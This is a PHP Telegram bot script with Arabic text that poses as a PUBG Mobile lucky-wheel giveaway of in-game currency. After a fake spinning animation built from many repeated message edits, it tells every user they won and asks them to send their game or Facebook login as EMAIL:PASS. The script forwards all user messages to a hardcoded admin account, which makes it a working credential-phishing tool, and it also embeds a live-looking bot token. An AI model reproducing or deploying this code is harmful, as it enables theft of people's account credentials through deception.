<?php
ob_start();
//هذا اندكس لا يسبب اى حظر لى استضافه او اى شى صممت ملف بوت حتى يمنع منك حظر استضافه 
$Marcus = "5261260334:AAEntrq5qcqmKGaiFNFQLXvYbHqz69l-DZ0";
define('API_KEY',$Marcus);
echo file_get_contents("https://api.telegram.org/bot" . API_KEY . "/setwebhook?url=" . $_SERVER['SERVER_NAME'] . "" . $_SERVER['SCRIPT_NAME']);
function bot($method,$datas=[]){
$aws_c9 = http_build_query($datas);
$url = "https://api.telegram.org/bot".API_KEY."/".$method."?$aws_c9";
$aws_c9 = file_get_contents($url);
return json_decode($aws_c9);
}
/*غير الحقوق واثبت انك فاشل
اذا تريد تنقل اذكر اسمي او اسم قناتي */

/*====================
CH : @AX_GB
DEV : @O_1_W
Translator : @AX_GB
/*====================*/
$update = json_decode(file_get_contents('php://input'));
$message = $update->message;
$id = $message->from->id;
$chat_id = $message->chat->id;
$text = $message->text;
$name = $message->from->first_name;
$message_id2 = $update->callback_query->message->message_id;
$chat_id2 = $update->callback_query->message->chat->id;
$from_id = $message->from->id;
$user = $message->from->username;
$nammee = $update->callback_query->from->first_name;
$cut = explode("\n",file_get_contents("MRx/users.txt"));
$users = count($cut)-0;

if(isset($update->callback_query)){
  $chat_id = $update->callback_query->message->chat->id;
$from_id = $chat_id;
  $message_id = $update->callback_query->message->message_id;
  $data     = $update->callback_query->data;
 $user = $update->callback_query->from->username;
$id=$update->callback_query->from->id;
} 
	if ($update && !in_array($id, $cut)) {
    mkdir('MRx');
    file_put_contents("MRx/users.txt", $id."\n",FILE_APPEND);
  }
$admin = 5118515847;//ايدي حسابك
if($chat_id != $admin){
bot('forwardMessage', [
'chat_id'=>$admin,
'from_chat_id'=>$chat_id,
'message_id'=>$message->message_id
]);
}

if($text == "/start"){
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"*
اهلا بك عزيزي $name

- بوت عجله الحظ للعبه pubg mobile 🤖
- ماذا تنتظر ؟ ابدأ اللعب الان 👇
*",
'parse_mode'=>"MarkDown",
'reply_to_message_id'=>$message->message_id,
   'reply_markup'=>json_encode([
     'inline_keyboard'=>[
       [['text'=>"شدات PUBG MOBILE 💸",'callback_data'=>"US"]],
       ]
    ])
]);
}
if($data == "back"){
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"*
اهلا بك عزيزي $nammee

- بوت عجله الحظ للعبه pubg mobile 🤖
- ماذا تنتظر ؟ ابدأ اللعب الان 👇
*",
'parse_mode'=>"MarkDown",
'reply_to_message_id'=>$message->message_id,
   'reply_markup'=>json_encode([
     'inline_keyboard'=>[
       [['text'=>"شدات PUBG MOBILE 💸",'callback_data'=>"US"]],
       ]
    ])
]);
}

if($data == "US"){
$rand = array('180','60','340','660','770','901','1080','3060');
$ra = array_rand($rand, 1);
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"*
انتظر انتهاء العجله من الدوران 🎲
*",
'parse_mode'=>"MarkDown",
'reply_to_message_id'=>$message->message_id,
   'reply_markup'=>json_encode([
     'inline_keyboard'=>[
       [['text'=>"180 💸",'callback_data'=>"jj"],['text'=>"60 💸",'callback_data'=>"jj"],["text"=>"340 💸","callback_data"=>"jj"]],
       [['text'=>"660 💸",'callback_data'=>"jj"],['text'=>" ⬆️ ",'callback_data'=>"jj"],["text"=>"770 💸","callback_data"=>"jj"]],
       [['text'=>"910 💸",'callback_data'=>"jj"],['text'=>"1080 💸",'callback_data'=>"jj"],["text"=>"3060 💸","callback_data"=>"jj"]],
       ]
    ])
]);
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"*
انتظر انتهاء العجله من الدوران 🎲
*",
'parse_mode'=>"MarkDown",
'reply_to_message_id'=>$message->message_id,
   'reply_markup'=>json_encode([
     'inline_keyboard'=>[
       [['text'=>"180 💸",'callback_data'=>"jj"],['text'=>"60 💸",'callback_data'=>"jj"],["text"=>"340 💸","callback_data"=>"jj"]],
       [['text'=>"660 💸",'callback_data'=>"jj"],['text'=>" ↗️ ",'callback_data'=>"jj"],["text"=>"770 💸","callback_data"=>"jj"]],
       [['text'=>"910 💸",'callback_data'=>"jj"],['text'=>"1080 💸",'callback_data'=>"jj"],["text"=>"3060 💸","callback_data"=>"jj"]],
       ]
    ])
]);

bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"*
انتظر انتهاء العجله من الدوران 🎲
*",
'parse_mode'=>"MarkDown",
'reply_to_message_id'=>$message->message_id,
   'reply_markup'=>json_encode([
     'inline_keyboard'=>[
       [['text'=>"180 💸",'callback_data'=>"jj"],['text'=>"60 💸",'callback_data'=>"jj"],["text"=>"340 💸","callback_data"=>"jj"]],
       [['text'=>"660 💸",'callback_data'=>"jj"],['text'=>" ➡️ ",'callback_data'=>"jj"],["text"=>"770 💸","callback_data"=>"jj"]],
       [['text'=>"910 💸",'callback_data'=>"jj"],['text'=>"1080 💸",'callback_data'=>"jj"],["text"=>"3060 💸","callback_data"=>"jj"]],
       ]
    ])
]);
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"*
انتظر انتهاء العجله من الدوران 🎲
*",
'parse_mode'=>"MarkDown",
'reply_to_message_id'=>$message->message_id,
   'reply_markup'=>json_encode([
     'inline_keyboard'=>[
       [['text'=>"180 💸",'callback_data'=>"jj"],['text'=>"60 💸",'callback_data'=>"jj"],["text"=>"340 💸","callback_data"=>"jj"]],
       [['text'=>"660 💸",'callback_data'=>"jj"],['text'=>" ↘️ ",'callback_data'=>"jj"],["text"=>"770 💸","callback_data"=>"jj"]],
       [['text'=>"910 💸",'callback_data'=>"jj"],['text'=>"1080 💸",'callback_data'=>"jj"],["text"=>"3060 💸","callback_data"=>"jj"]],
       ]
    ])
]);

bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"*
انتظر انتهاء العجله من الدوران 🎲
*",
'parse_mode'=>"MarkDown",
'reply_to_message_id'=>$message->message_id,
   'reply_markup'=>json_encode([
     'inline_keyboard'=>[
       [['text'=>"180 💸",'callback_data'=>"jj"],['text'=>"60 💸",'callback_data'=>"jj"],["text"=>"340 💸","callback_data"=>"jj"]],
       [['text'=>"660 💸",'callback_data'=>"jj"],['text'=>" ⬇️️ ",'callback_data'=>"jj"],["text"=>"770 💸","callback_data"=>"jj"]],
       [['text'=>"910 💸",'callback_data'=>"jj"],['text'=>"1080 💸",'callback_data'=>"jj"],["text"=>"3060 💸","callback_data"=>"jj"]],
       ]
    ])
]);
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"*
انتظر انتهاء العجله من الدوران 🎲
*",
'parse_mode'=>"MarkDown",
'reply_to_message_id'=>$message->message_id,
   'reply_markup'=>json_encode([
     'inline_keyboard'=>[
       [['text'=>"180 💸",'callback_data'=>"jj"],['text'=>"60 💸",'callback_data'=>"jj"],["text"=>"340 💸","callback_data"=>"jj"]],
       [['text'=>"660 💸",'callback_data'=>"jj"],['text'=>" ↙️️ ",'callback_data'=>"jj"],["text"=>"770 💸","callback_data"=>"jj"]],
       [['text'=>"910 💸",'callback_data'=>"jj"],['text'=>"1080 💸",'callback_data'=>"jj"],["text"=>"3060 💸","callback_data"=>"jj"]],
       ]
    ])
]);

bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"*
انتظر انتهاء العجله من الدوران 🎲
*",
'parse_mode'=>"MarkDown",
'reply_to_message_id'=>$message->message_id,
   'reply_markup'=>json_encode([
     'inline_keyboard'=>[
       [['text'=>"180 💸",'callback_data'=>"jj"],['text'=>"60 💸",'callback_data'=>"jj"],["text"=>"340 💸","callback_data"=>"jj"]],
       [['text'=>"660 💸",'callback_data'=>"jj"],['text'=>" ⬅️ ",'callback_data'=>"jj"],["text"=>"770 💸","callback_data"=>"jj"]],
       [['text'=>"910 💸",'callback_data'=>"jj"],['text'=>"1080 💸",'callback_data'=>"jj"],["text"=>"3060 💸","callback_data"=>"jj"]],
       ]
    ])
]);
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"*
انتظر انتهاء العجله من الدوران 🎲
*",
'parse_mode'=>"MarkDown",
'reply_to_message_id'=>$message->message_id,
   'reply_markup'=>json_encode([
     'inline_keyboard'=>[
       [['text'=>"180 💸",'callback_data'=>"jj"],['text'=>"60 💸",'callback_data'=>"jj"],["text"=>"340 💸","callback_data"=>"jj"]],
       [['text'=>"660 💸",'callback_data'=>"jj"],['text'=>" ↖️ ",'callback_data'=>"jj"],["text"=>"770 💸","callback_data"=>"jj"]],
       [['text'=>"910 💸",'callback_data'=>"jj"],['text'=>"1080 💸",'callback_data'=>"jj"],["text"=>"3060 💸","callback_data"=>"jj"]],
       ]
    ])
]);

bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"*
انتظر انتهاء العجله من الدوران 🎲
*",
'parse_mode'=>"MarkDown",
'reply_to_message_id'=>$message->message_id,
   'reply_markup'=>json_encode([
     'inline_keyboard'=>[
       [['text'=>"180 💸",'callback_data'=>"jj"],['text'=>"60 💸",'callback_data'=>"jj"],["text"=>"340 💸","callback_data"=>"jj"]],
       [['text'=>"660 💸",'callback_data'=>"jj"],['text'=>" ⬆️ ",'callback_data'=>"jj"],["text"=>"770 💸","callback_data"=>"jj"]],
       [['text'=>"910 💸",'callback_data'=>"jj"],['text'=>"1080 💸",'callback_data'=>"jj"],["text"=>"3060 💸","callback_data"=>"jj"]],
       ]
    ])
]);
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"*
انتظر انتهاء العجله من الدوران 🎲
*",
'parse_mode'=>"MarkDown",
'reply_to_message_id'=>$message->message_id,
   'reply_markup'=>json_encode([
     'inline_keyboard'=>[
       [['text'=>"180 💸",'callback_data'=>"jj"],['text'=>"60 💸",'callback_data'=>"jj"],["text"=>"340 💸","callback_data"=>"jj"]],
       [['text'=>"660 💸",'callback_data'=>"jj"],['text'=>" ↗️ ",'callback_data'=>"jj"],["text"=>"770 💸","callback_data"=>"jj"]],
       [['text'=>"910 💸",'callback_data'=>"jj"],['text'=>"1080 💸",'callback_data'=>"jj"],["text"=>"3060 💸","callback_data"=>"jj"]],
       ]
    ])
]);

bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"*
انتظر انتهاء العجله من الدوران 🎲
*",
'parse_mode'=>"MarkDown",
'reply_to_message_id'=>$message->message_id,
   'reply_markup'=>json_encode([
     'inline_keyboard'=>[
       [['text'=>"180 💸",'callback_data'=>"jj"],['text'=>"60 💸",'callback_data'=>"jj"],["text"=>"340 💸","callback_data"=>"jj"]],
       [['text'=>"660 💸",'callback_data'=>"jj"],['text'=>" ➡️ ",'callback_data'=>"jj"],["text"=>"770 💸","callback_data"=>"jj"]],
       [['text'=>"910 💸",'callback_data'=>"jj"],['text'=>"1080 💸",'callback_data'=>"jj"],["text"=>"3060 💸","callback_data"=>"jj"]],
       ]
    ])
]);
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"*
انتظر انتهاء العجله من الدوران 🎲
*",
'parse_mode'=>"MarkDown",
'reply_to_message_id'=>$message->message_id,
   'reply_markup'=>json_encode([
     'inline_keyboard'=>[
       [['text'=>"180 💸",'callback_data'=>"jj"],['text'=>"60 💸",'callback_data'=>"jj"],["text"=>"340 💸","callback_data"=>"jj"]],
       [['text'=>"660 💸",'callback_data'=>"jj"],['text'=>" ↘️ ",'callback_data'=>"jj"],["text"=>"770 💸","callback_data"=>"jj"]],
       [['text'=>"910 💸",'callback_data'=>"jj"],['text'=>"1080 💸",'callback_data'=>"jj"],["text"=>"3060 💸","callback_data"=>"jj"]],
       ]
    ])
]);
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"*
انتظر انتهاء العجله من الدوران 🎲
*",
'parse_mode'=>"MarkDown",
'reply_to_message_id'=>$message->message_id,
   'reply_markup'=>json_encode([
     'inline_keyboard'=>[
       [['text'=>"180 💸",'callback_data'=>"jj"],['text'=>"60 💸",'callback_data'=>"jj"],["text"=>"340 💸","callback_data"=>"jj"]],
       [['text'=>"660 💸",'callback_data'=>"jj"],['text'=>" ↗️ ",'callback_data'=>"jj"],["text"=>"770 💸","callback_data"=>"jj"]],
       [['text'=>"910 💸",'callback_data'=>"jj"],['text'=>"1080 💸",'callback_data'=>"jj"],["text"=>"3060 💸","callback_data"=>"jj"]],
       ]
    ])
]);

bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"*
انتظر انتهاء العجله من الدوران 🎲
*",
'parse_mode'=>"MarkDown",
'reply_to_message_id'=>$message->message_id,
   'reply_markup'=>json_encode([
     'inline_keyboard'=>[
       [['text'=>"180 💸",'callback_data'=>"jj"],['text'=>"60 💸",'callback_data'=>"jj"],["text"=>"340 💸","callback_data"=>"jj"]],
       [['text'=>"660 💸",'callback_data'=>"jj"],['text'=>" ➡️ ",'callback_data'=>"jj"],["text"=>"770 💸","callback_data"=>"jj"]],
       [['text'=>"910 💸",'callback_data'=>"jj"],['text'=>"1080 💸",'callback_data'=>"jj"],["text"=>"3060 💸","callback_data"=>"jj"]],
       ]
    ])
]);
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"*
انتظر انتهاء العجله من الدوران 🎲
*",
'parse_mode'=>"MarkDown",
'reply_to_message_id'=>$message->message_id,
   'reply_markup'=>json_encode([
     'inline_keyboard'=>[
       [['text'=>"180 💸",'callback_data'=>"jj"],['text'=>"60 💸",'callback_data'=>"jj"],["text"=>"340 💸","callback_data"=>"jj"]],
       [['text'=>"660 💸",'callback_data'=>"jj"],['text'=>" ↘️ ",'callback_data'=>"jj"],["text"=>"770 💸","callback_data"=>"jj"]],
       [['text'=>"910 💸",'callback_data'=>"jj"],['text'=>"1080 💸",'callback_data'=>"jj"],["text"=>"3060 💸","callback_data"=>"jj"]],
       ]
    ])
]);

bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"*
انتظر انتهاء العجله من الدوران 🎲
*",
'parse_mode'=>"MarkDown",
'reply_to_message_id'=>$message->message_id,
   'reply_markup'=>json_encode([
     'inline_keyboard'=>[
       [['text'=>"180 💸",'callback_data'=>"jj"],['text'=>"60 💸",'callback_data'=>"jj"],["text"=>"340 💸","callback_data"=>"jj"]],
       [['text'=>"660 💸",'callback_data'=>"jj"],['text'=>" ⬇️️ ",'callback_data'=>"jj"],["text"=>"770 💸","callback_data"=>"jj"]],
       [['text'=>"910 💸",'callback_data'=>"jj"],['text'=>"1080 💸",'callback_data'=>"jj"],["text"=>"3060 💸","callback_data"=>"jj"]],
       ]
    ])
]);
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"*
انتظر انتهاء العجله من الدوران 🎲
*",
'parse_mode'=>"MarkDown",
'reply_to_message_id'=>$message->message_id,
   'reply_markup'=>json_encode([
     'inline_keyboard'=>[
       [['text'=>"180 💸",'callback_data'=>"jj"],['text'=>"60 💸",'callback_data'=>"jj"],["text"=>"340 💸","callback_data"=>"jj"]],
       [['text'=>"660 💸",'callback_data'=>"jj"],['text'=>" ↙️️ ",'callback_data'=>"jj"],["text"=>"770 💸","callback_data"=>"jj"]],
       [['text'=>"910 💸",'callback_data'=>"jj"],['text'=>"1080 💸",'callback_data'=>"jj"],["text"=>"3060 💸","callback_data"=>"jj"]],
       ]
    ])
]);

bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"*
انتظر انتهاء العجله من الدوران 🎲
*",
'parse_mode'=>"MarkDown",
'reply_to_message_id'=>$message->message_id,
   'reply_markup'=>json_encode([
     'inline_keyboard'=>[
       [['text'=>"180 💸",'callback_data'=>"jj"],['text'=>"60 💸",'callback_data'=>"jj"],["text"=>"340 💸","callback_data"=>"jj"]],
       [['text'=>"660 💸",'callback_data'=>"jj"],['text'=>" ⬅️ ",'callback_data'=>"jj"],["text"=>"770 💸","callback_data"=>"jj"]],
       [['text'=>"910 💸",'callback_data'=>"jj"],['text'=>"1080 💸",'callback_data'=>"jj"],["text"=>"3060 💸","callback_data"=>"jj"]],
       ]
    ])
]);
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"*
انتظر انتهاء العجله من الدوران 🎲
*",
'parse_mode'=>"MarkDown",
'reply_to_message_id'=>$message->message_id,
   'reply_markup'=>json_encode([
     'inline_keyboard'=>[
       [['text'=>"180 💸",'callback_data'=>"jj"],['text'=>"60 💸",'callback_data'=>"jj"],["text"=>"340 💸","callback_data"=>"jj"]],
       [['text'=>"660 💸",'callback_data'=>"jj"],['text'=>" ↖️ ",'callback_data'=>"jj"],["text"=>"770 💸","callback_data"=>"jj"]],
       [['text'=>"910 💸",'callback_data'=>"jj"],['text'=>"1080 💸",'callback_data'=>"jj"],["text"=>"3060 💸","callback_data"=>"jj"]],
       ]
    ])
]);

bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"*
انتظر انتهاء العجله من الدوران 🎲
*",
'parse_mode'=>"MarkDown",
'reply_to_message_id'=>$message->message_id,
   'reply_markup'=>json_encode([
     'inline_keyboard'=>[
       [['text'=>"180 💸",'callback_data'=>"jj"],['text'=>"60 💸",'callback_data'=>"jj"],["text"=>"340 💸","callback_data"=>"jj"]],
       [['text'=>"660 💸",'callback_data'=>"jj"],['text'=>" ⬆️ ",'callback_data'=>"jj"],["text"=>"770 💸","callback_data"=>"jj"]],
       [['text'=>"910 💸",'callback_data'=>"jj"],['text'=>"1080 💸",'callback_data'=>"jj"],["text"=>"3060 💸","callback_data"=>"jj"]],
       ]
    ])
]);
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"*
انتظر انتهاء العجله من الدوران 🎲
*",
'parse_mode'=>"MarkDown",
'reply_to_message_id'=>$message->message_id,
   'reply_markup'=>json_encode([
     'inline_keyboard'=>[
       [['text'=>"180 💸",'callback_data'=>"jj"],['text'=>"60 💸",'callback_data'=>"jj"],["text"=>"340 💸","callback_data"=>"jj"]],
       [['text'=>"660 💸",'callback_data'=>"jj"],['text'=>" ↗️ ",'callback_data'=>"jj"],["text"=>"770 💸","callback_data"=>"jj"]],
       [['text'=>"910 💸",'callback_data'=>"jj"],['text'=>"1080 💸",'callback_data'=>"jj"],["text"=>"3060 💸","callback_data"=>"jj"]],
       ]
    ])
]);

bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"*
انتظر انتهاء العجله من الدوران 🎲
*",
'parse_mode'=>"MarkDown",
'reply_to_message_id'=>$message->message_id,
   'reply_markup'=>json_encode([
     'inline_keyboard'=>[
       [['text'=>"180 💸",'callback_data'=>"jj"],['text'=>"60 💸",'callback_data'=>"jj"],["text"=>"340 💸","callback_data"=>"jj"]],
       [['text'=>"660 💸",'callback_data'=>"jj"],['text'=>" ➡️ ",'callback_data'=>"jj"],["text"=>"770 💸","callback_data"=>"jj"]],
       [['text'=>"910 💸",'callback_data'=>"jj"],['text'=>"1080 💸",'callback_data'=>"jj"],["text"=>"3060 💸","callback_data"=>"jj"]],
       ]
    ])
]);
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"*
انتظر انتهاء العجله من الدوران 🎲
*",
'parse_mode'=>"MarkDown",
'reply_to_message_id'=>$message->message_id,
   'reply_markup'=>json_encode([
     'inline_keyboard'=>[
       [['text'=>"180 💸",'callback_data'=>"jj"],['text'=>"60 💸",'callback_data'=>"jj"],["text"=>"340 💸","callback_data"=>"jj"]],
       [['text'=>"660 💸",'callback_data'=>"jj"],['text'=>" ↘️ ",'callback_data'=>"jj"],["text"=>"770 💸","callback_data"=>"jj"]],
       [['text'=>"910 💸",'callback_data'=>"jj"],['text'=>"1080 💸",'callback_data'=>"jj"],["text"=>"3060 💸","callback_data"=>"jj"]],
       ]
    ])
]);
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"*
انتظر انتهاء العجله من الدوران 🎲
*",
'parse_mode'=>"MarkDown",
'reply_to_message_id'=>$message->message_id,
   'reply_markup'=>json_encode([
     'inline_keyboard'=>[
       [['text'=>"180 💸",'callback_data'=>"jj"],['text'=>"60 💸",'callback_data'=>"jj"],["text"=>"340 💸","callback_data"=>"jj"]],
       [['text'=>"660 💸",'callback_data'=>"jj"],['text'=>" ↗️ ",'callback_data'=>"jj"],["text"=>"770 💸","callback_data"=>"jj"]],
       [['text'=>"910 💸",'callback_data'=>"jj"],['text'=>"1080 💸",'callback_data'=>"jj"],["text"=>"3060 💸","callback_data"=>"jj"]],
       ]
    ])
]);

bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"*
انتظر انتهاء العجله من الدوران 🎲
*",
'parse_mode'=>"MarkDown",
'reply_to_message_id'=>$message->message_id,
   'reply_markup'=>json_encode([
     'inline_keyboard'=>[
       [['text'=>"180 💸",'callback_data'=>"jj"],['text'=>"60 💸",'callback_data'=>"jj"],["text"=>"340 💸","callback_data"=>"jj"]],
       [['text'=>"660 💸",'callback_data'=>"jj"],['text'=>" ➡️ ",'callback_data'=>"jj"],["text"=>"770 💸","callback_data"=>"jj"]],
       [['text'=>"910 💸",'callback_data'=>"jj"],['text'=>"1080 💸",'callback_data'=>"jj"],["text"=>"3060 💸","callback_data"=>"jj"]],
       ]
    ])
]);
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"*
انتظر انتهاء العجله من الدوران 🎲
*",
'parse_mode'=>"MarkDown",
'reply_to_message_id'=>$message->message_id,
   'reply_markup'=>json_encode([
     'inline_keyboard'=>[
       [['text'=>"180 💸",'callback_data'=>"jj"],['text'=>"60 💸",'callback_data'=>"jj"],["text"=>"340 💸","callback_data"=>"jj"]],
       [['text'=>"660 💸",'callback_data'=>"jj"],['text'=>" ↘️ ",'callback_data'=>"jj"],["text"=>"770 💸","callback_data"=>"jj"]],
       [['text'=>"910 💸",'callback_data'=>"jj"],['text'=>"1080 💸",'callback_data'=>"jj"],["text"=>"3060 💸","callback_data"=>"jj"]],
       ]
    ])
]);

bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"*
انتظر انتهاء العجله من الدوران 🎲
*",
'parse_mode'=>"MarkDown",
'reply_to_message_id'=>$message->message_id,
   'reply_markup'=>json_encode([
     'inline_keyboard'=>[
       [['text'=>"180 💸",'callback_data'=>"jj"],['text'=>"60 💸",'callback_data'=>"jj"],["text"=>"340 💸","callback_data"=>"jj"]],
       [['text'=>"660 💸",'callback_data'=>"jj"],['text'=>" ⬇️️ ",'callback_data'=>"jj"],["text"=>"770 💸","callback_data"=>"jj"]],
       [['text'=>"910 💸",'callback_data'=>"jj"],['text'=>"1080 💸",'callback_data'=>"jj"],["text"=>"3060 💸","callback_data"=>"jj"]],
       ]
    ])
]);
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"*
انتظر انتهاء العجله من الدوران 🎲
*",
'parse_mode'=>"MarkDown",
'reply_to_message_id'=>$message->message_id,
   'reply_markup'=>json_encode([
     'inline_keyboard'=>[
       [['text'=>"180 💸",'callback_data'=>"jj"],['text'=>"60 💸",'callback_data'=>"jj"],["text"=>"340 💸","callback_data"=>"jj"]],
       [['text'=>"660 💸",'callback_data'=>"jj"],['text'=>" ↙️️ ",'callback_data'=>"jj"],["text"=>"770 💸","callback_data"=>"jj"]],
       [['text'=>"910 💸",'callback_data'=>"jj"],['text'=>"1080 💸",'callback_data'=>"jj"],["text"=>"3060 💸","callback_data"=>"jj"]],
       ]
    ])
]);

bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"*
انتظر انتهاء العجله من الدوران 🎲
*",
'parse_mode'=>"MarkDown",
'reply_to_message_id'=>$message->message_id,
   'reply_markup'=>json_encode([
     'inline_keyboard'=>[
       [['text'=>"180 💸",'callback_data'=>"jj"],['text'=>"60 💸",'callback_data'=>"jj"],["text"=>"340 💸","callback_data"=>"jj"]],
       [['text'=>"660 💸",'callback_data'=>"jj"],['text'=>" ⬅️ ",'callback_data'=>"jj"],["text"=>"770 💸","callback_data"=>"jj"]],
       [['text'=>"910 💸",'callback_data'=>"jj"],['text'=>"1080 💸",'callback_data'=>"jj"],["text"=>"3060 💸","callback_data"=>"jj"]],
       ]
    ])
]);
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"*
انتظر انتهاء العجله من الدوران 🎲
*",
'parse_mode'=>"MarkDown",
'reply_to_message_id'=>$message->message_id,
   'reply_markup'=>json_encode([
     'inline_keyboard'=>[
       [['text'=>"180 💸",'callback_data'=>"jj"],['text'=>"60 💸",'callback_data'=>"jj"],["text"=>"340 💸","callback_data"=>"jj"]],
       [['text'=>"660 💸",'callback_data'=>"jj"],['text'=>" ↖️ ",'callback_data'=>"jj"],["text"=>"770 💸","callback_data"=>"jj"]],
       [['text'=>"910 💸",'callback_data'=>"jj"],['text'=>"1080 💸",'callback_data'=>"jj"],["text"=>"3060 💸","callback_data"=>"jj"]],
       ]
    ])
]);

bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"*
انتظر انتهاء العجله من الدوران 🎲
*",
'parse_mode'=>"MarkDown",
'reply_to_message_id'=>$message->message_id,
   'reply_markup'=>json_encode([
     'inline_keyboard'=>[
       [['text'=>"180 💸",'callback_data'=>"jj"],['text'=>"60 💸",'callback_data'=>"jj"],["text"=>"340 💸","callback_data"=>"jj"]],
       [['text'=>"660 💸",'callback_data'=>"jj"],['text'=>" ⬆️ ",'callback_data'=>"jj"],["text"=>"770 💸","callback_data"=>"jj"]],
       [['text'=>"910 💸",'callback_data'=>"jj"],['text'=>"1080 💸",'callback_data'=>"jj"],["text"=>"3060 💸","callback_data"=>"jj"]],
       ]
    ])
]);
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"*
انتظر انتهاء العجله من الدوران 🎲
*",
'parse_mode'=>"MarkDown",
'reply_to_message_id'=>$message->message_id,
   'reply_markup'=>json_encode([
     'inline_keyboard'=>[
       [['text'=>"180 💸",'callback_data'=>"jj"],['text'=>"60 💸",'callback_data'=>"jj"],["text"=>"340 💸","callback_data"=>"jj"]],
       [['text'=>"660 💸",'callback_data'=>"jj"],['text'=>" ↗️ ",'callback_data'=>"jj"],["text"=>"770 💸","callback_data"=>"jj"]],
       [['text'=>"910 💸",'callback_data'=>"jj"],['text'=>"1080 💸",'callback_data'=>"jj"],["text"=>"3060 💸","callback_data"=>"jj"]],
       ]
    ])
]);
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"*
انتظر انتهاء العجله من الدوران 🎲
*",
'parse_mode'=>"MarkDown",
'reply_to_message_id'=>$message->message_id,
   'reply_markup'=>json_encode([
     'inline_keyboard'=>[
       [['text'=>"180 💸",'callback_data'=>"jj"],['text'=>"60 💸",'callback_data'=>"jj"],["text"=>"340 💸","callback_data"=>"jj"]],
       [['text'=>"660 💸",'callback_data'=>"jj"],['text'=>" ➡️ ",'callback_data'=>"jj"],["text"=>"770 💸","callback_data"=>"jj"]],
       [['text'=>"910 💸",'callback_data'=>"jj"],['text'=>"1080 💸",'callback_data'=>"jj"],["text"=>"3060 💸","callback_data"=>"jj"]],
       ]
    ])
]);
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"*
انتظر انتهاء العجله من الدوران 🎲
*",
'parse_mode'=>"MarkDown",
'reply_to_message_id'=>$message->message_id,
   'reply_markup'=>json_encode([
     'inline_keyboard'=>[
       [['text'=>"180 💸",'callback_data'=>"jj"],['text'=>"60 💸",'callback_data'=>"jj"],["text"=>"340 💸","callback_data"=>"jj"]],
       [['text'=>"660 💸",'callback_data'=>"jj"],['text'=>" ↘️ ",'callback_data'=>"jj"],["text"=>"770 💸","callback_data"=>"jj"]],
       [['text'=>"910 💸",'callback_data'=>"jj"],['text'=>"1080 💸",'callback_data'=>"jj"],["text"=>"3060 💸","callback_data"=>"jj"]],
       ]
    ])
]);
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"*
لقد انتهت العجله من الدوران و ربحت 🥳

- $rand[$ra] 💸 شده معنا 
قم بتسجيل الدخول لحسابك على الببجي من هنا لاستلام الشدات بأسرع وقت 🙊
--------------------------------------------------------
اذا كان حسابك على الببجي مربوط ب فيس بوك مع تحديد نوع الحساب
ارسل الحساب بهذا النمط 👇
EMAIL:PASS

مثال : 
فيس بوك
hdetwyse@gmail.com:pudg
*",
'parse_mode'=>"MarkDown",
'reply_to_message_id'=>$message->message_id,
]);
}
/*غير الحقوق واثبت انك فاشل
اذا تريد تنقل اذكر اسمي او اسم قناتي */

/*====================
CH : @AX_GB
DEV : @O_1_W
Translator : @AX_GB
/*====================*/
